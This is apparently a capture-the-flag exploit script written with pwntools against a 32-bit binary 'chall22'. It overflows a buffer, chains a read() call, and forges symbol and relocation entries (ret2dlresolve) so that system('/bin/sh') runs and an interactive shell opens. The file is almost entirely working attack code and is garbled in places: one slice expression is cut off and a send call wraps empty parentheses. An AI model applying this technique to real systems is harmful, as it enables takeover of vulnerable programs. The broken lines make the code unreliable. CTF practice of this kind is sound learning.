from pwn import *

e = ELF("./chall22")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("challenge.pwny.racing", 40022)
else:
  p = process(e.path)


plt = e.get_section_by_name(".plt")["sh_addr"]
sym_tab = e.dynamic_value_by_tag("DT_SYMTAB")
str_tab = e.dynamic_value_by_tag("DT_STRTAB")
jmp_rel = e.dynamic_value_by_tag("DT_JMPREL")

print("{:#x} {:#x} {:#x} {:#x}".format(sym_tab, str_tab, jmp_rel, plt))

buff = 0x0804a000 + 0x20
gdb.attach(p)
p.send("A" * 24 + "A" * 4 + p32(e.symbols["read"]) + p32(e.symbols["play"]) + p32(0) + p32(buff) + p32(0x100))


pay = p32(0) * 4

sh_offset = len(pay)
pay += "/bin/sh\0"

system_offset = len(pay)
pay += "system\0"

# Alignment
pay += "A" * ((sym_tab - len(pay)) % 16)

sym_offset = len(pay)
fake_sym = p32(buff + system_offset - str_tab) + p32(0) * 3
pay += fake_sym

rel_offset = len(pay)
fake_rel = p32(buff + 0x300)
r_info = ((sym_offset + buff - sym_tab) // 16)
r_info = (r_info << 8) | 7
fake_rel += r_info
pay += fake_rel

rop = p32(plt) + p32(buff + rel_offset - jmp_rel) + p32(0x1337) + p32(buff + sh_offset)
pay = rop + pay[2

p.send(

(

).ljust(0x100)

)

p.sendline("A" * 24 + p32(buff - 4) + p32(0x804843f))

p.interactive()
